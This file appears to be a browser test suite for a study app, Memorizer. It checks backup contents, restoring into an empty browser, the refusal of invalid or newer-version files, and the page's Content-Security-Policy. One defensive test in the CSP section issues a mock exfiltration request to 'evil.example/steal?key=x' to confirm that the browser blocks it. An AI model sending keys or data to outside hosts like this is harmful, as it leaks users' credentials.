#!/usr/bin/env node
/*
 * Your data, and what the page may do with it, in a real browser.
 *
 *   NODE_PATH=$(npm root -g) node tests/verify-memorizer-data.js
 *
 * Builds memorizer/ itself; every file here is written by the suite. Needs
 * no network.
 *
 * WHAT IS PROVEN:
 *   · a backup holds the units, packs and progress and not the PDFs;
 *   · restored into an empty browser, the unit opens with its pack and its
 *     progress; a unit whose PDF is not on the device is marked so;
 *   · a file that is not a backup, or is from a newer Memorizer, is refused
 *     with its reason and changes nothing;
 *   · under the page's Content-Security-Policy the browser refuses a request
 *     to any host but the ones the app uses; the policy never grants eval.
 */
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const { launch } = require('./_engine');
const { onDeath, watch } = require('./_deathnote.js');

let passed = 0, failed = 0;
const ok = (label, cond, detail = '') => {
  cond ? passed++ : failed++;
  console.log((cond ? '  PASS  ' : '  FAIL  ') + label + (detail ? '  → ' + detail : ''));
};
let section = '';
const head = t => { section = t; console.log('\n── ' + t + ' ──'); };
const errors = [], events = [];
onDeath(() => ({ section, checks: passed + failed, errors, events }));

const ROOT = path.join(__dirname, '..');
const { build } = require(path.join(ROOT, 'scripts', 'build-memorizer.js'));
const MD = ['---', 'unit: Ventricular Loading', '---', '', '## Teaching Points',
  '- **Preload**: the stretch on the ventricular wall at the end of filling.',
  '- **Afterload**: the load the ventricle pumps against during ejection.', '', '## Quiz', '',
  '### Question 1', '**Stem**: Which term names the wall stretch at the end of filling?',
  '- A) Preload', '- B) Afterload', '- C) Inotropy', '- D) Compliance', '**Correct Answer**: A'].join('\n');

(async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'memorizer-data-'));
  build(dir);
  const URL = 'file://' + path.join(dir, 'index.html');
  const T = { timeout: 30000 };
  const browser = await launch();
  const fresh = async tag => {
    const ctx = await browser.newContext({ viewport: { width: 820, height: 1100 }, serviceWorkers: 'block', acceptDownloads: true });
    const p = watch(await ctx.newPage(), events, tag, errors);
    await p.goto(URL);
    await p.waitForSelector('#chip-import-study', T);
    return { ctx, p };
  };
  const toSettings = async p => {
    await p.evaluate(() => { const b = [...document.querySelectorAll('nav button, .nav-btn')].find(x => /Settings/.test(x.textContent)); b.click(); });
    await p.waitForSelector('#data-card', T);
  };
  const restoreFile = async (p, name, obj) => {
    await p.setInputFiles('#restore-file', { name, mimeType: 'application/json', buffer: Buffer.from(typeof obj === 'string' ? obj : JSON.stringify(obj)) });
  };
  try {
    head('a backup');
    let { ctx, p } = await fresh('backup');
    await p.click('#chip-import-study'); await p.waitForSelector('#import-dialog', T);
    await p.setInputFiles('#import-file', { name: 'loading.md', mimeType: 'text/markdown', buffer: Buffer.from(MD) });
    await p.waitForFunction(() => !document.getElementById('import-go').disabled, null, T);
    await p.click('#import-go');
    await p.waitForSelector('#learn-unit', T);
    /* some progress to carry: the section marked as studied */
    await p.evaluate(() => { Memorizer.ui.state.per[0].seenDay = '2026-01-02'; return MemStore.put('sessions', { id: Memorizer.ui.docId, state: Memorizer.ui.state }); });
    await p.evaluate(() => MemStore.put('files', { id: 'stray-pdf', bytes: new Uint8Array([1, 2, 3]) }));
    await toSettings(p);
    ok('Settings says where the data lives and whether it is kept', /only on this device/.test(await p.$eval('#data-kept', e => e.textContent)));
    const [dl] = await Promise.all([p.waitForEvent('download', T), p.click('#backup-go')]);
    const file = path.join(dir, 'backup.json');
    await dl.saveAs(file);
    const b = JSON.parse(fs.readFileSync(file, 'utf8'));
    ok('it is one file, named for the day', /^memorizer-backup-\d{4}-\d\d-\d\d\.json$/.test(dl.suggestedFilename()), dl.suggestedFilename());
    ok('it holds the unit, its pack and its progress', b.format === 'memorizer-backup' && b.stores.docs.length === 1 && b.stores.packs.length === 1 &&
       b.stores.sessions.length === 1 && b.stores.sessions[0].state.per[0].seenDay === '2026-01-02', JSON.stringify(Object.keys(b.stores).map(k => [k, b.stores[k].length])));
    ok('and not the PDFs’ bytes, nor search vectors', !('files' in b.stores) && !('vectors' in b.stores));
    await p.waitForSelector('#data-last', T);
    ok('and the card remembers when', /Last backup: \d{4}-\d\d-\d\d/.test(await p.$eval('#data-last', e => e.textContent)));
    await ctx.close();

    head('restored into an empty browser');
    ({ ctx, p } = await fresh('restore'));
    p.on('dialog', d => d.accept());
    await toSettings(p);
    await restoreFile(p, 'backup.json', b);
    await p.waitForSelector('#data-note', T);
    ok('it says what came back, and that PDFs are not in a backup', /Restored 1 unit/.test(await p.$eval('#data-note', e => e.textContent)) && /PDFs are not in a backup/.test(await p.$eval('#data-note', e => e.textContent)));
    const back = await p.evaluate(() => Promise.all([MemStore.all('docs'), MemStore.all('packs'), MemStore.all('sessions')]).then(([d, k, s]) => ({ d: d.length, k: k.length, seen: s[0] && s[0].state.per[0].seenDay })));
    ok('the unit, its pack and its progress are here', back.d === 1 && back.k === 1 && back.seen === '2026-01-02', JSON.stringify(back));
    await p.evaluate(id => Memorizer.openDoc(id), b.stores.docs[0].id);
    await p.waitForSelector('#learn-unit', T);
    ok('and it opens', await p.$('#unit-now') !== null);
    await ctx.close();

    head('what is refused');
    ({ ctx, p } = await fresh('refuse'));
    let asked = 0;
    p.on('dialog', d => { asked++; d.accept(); });
    await toSettings(p);
    await restoreFile(p, 'notes.json', '{"hello": 1}');
    await p.waitForFunction(() => /Not restored/.test((document.getElementById('data-note') || {}).textContent || ''), null, T);
    ok('a file that is not a backup, with the reason', /not a Memorizer backup/.test(await p.$eval('#data-note', e => e.textContent)));
    await restoreFile(p, 'future.json', Object.assign({}, b, { version: 99 }));
    await p.waitForFunction(() => /newer Memorizer/.test((document.getElementById('data-note') || {}).textContent || ''), null, T);
    ok('a backup from a newer Memorizer, with the reason', /version 99/.test(await p.$eval('#data-note', e => e.textContent)));
    const direct = await p.evaluate(() => MemStore.restore({ format: 'memorizer-backup', version: 1, stores: { docs: [{ name: 'no id' }] } }).then(() => 'stored', e => e.message));
    ok('the store itself refuses a bad backup, whoever calls it', /has no id/.test(direct), direct);
    ok('neither asked to go ahead, and neither changed anything', asked === 0 && await p.evaluate(() => MemStore.all('docs').then(d => d.length)) === 0);
    const withPdf = JSON.parse(JSON.stringify(b)); withPdf.stores.docs[0].hasFile = true;
    await restoreFile(p, 'pdf.json', withPdf);
    await p.waitForFunction(() => /Restored/.test((document.getElementById('data-note') || {}).textContent || ''), null, T);
    ok('a unit whose PDF is not on this device is marked so, not left pointing at nothing', await p.evaluate(() => MemStore.all('docs').then(d => d[0].hasFile)) === false);
    await ctx.close();

    head('what the page may do');
    ({ ctx, p } = await fresh('csp'));
    const sec = await p.evaluate(async () => {
      const csp = (document.querySelector('meta[http-equiv="Content-Security-Policy"]') || {}).content || '';
      /* measured by the browser's own report of what it refused: this
         sandbox has no network, so a failed fetch alone would prove nothing */
      const refused = [];
      document.addEventListener('securitypolicyviolation', e => refused.push(e.violatedDirective + ' ' + e.blockedURI));
      try { await fetch('https://evil.example/steal?key=x'); } catch (e) {}
      await new Promise(r => setTimeout(r, 300));
      return { csp, refused };
    });
    ok('the page carries a Content-Security-Policy that lets it talk to Anthropic', /connect-src[^;]*https:\/\/api\.anthropic\.com/.test(sec.csp), sec.csp.slice(0, 120));
    ok('the browser refuses a request to any other host under that policy: the key has nowhere else to go',
       sec.refused.some(r => /^connect-src https:\/\/evil\.example/.test(r)), JSON.stringify(sec.refused));
    /* Whether eval is refused at run time cannot be measured here: code the
       test harness injects is not held to the page's policy. What is held:
       the policy never grants it, and the app's own code does not use it. */
    ok('the policy never grants eval (only WebAssembly compilation)', !/'unsafe-eval'/.test(sec.csp) && /'wasm-unsafe-eval'/.test(sec.csp));
    /* the app's own modules, comments blanked (tests/_source.js): the files
       explain what they avoid in the words they avoid */
    const { blankComments } = require('./_source');
    const own = fs.readdirSync(path.join(ROOT, 'memorizer', 'src')).filter(f => f.endsWith('.js'))
      .filter(f => /new Function\(|[^.\w]eval\(/.test(blankComments(fs.readFileSync(path.join(ROOT, 'memorizer', 'src', f), 'utf8'))));
    ok('and the app\u2019s own code builds no function from a string', own.length === 0, own.join(', '));
    await ctx.close();
  } finally {
    await browser.close();
  }
  const real = errors.filter(e => !/Content Security Policy|evil\.example|Refused to/.test(e));
  ok('no page errors (the refusals provoked above aside)', !real.length, real.join(' | '));
  console.log('\n' + passed + ' passed, ' + failed + ' failed');
  process.exit(failed ? 1 : 0);
})();
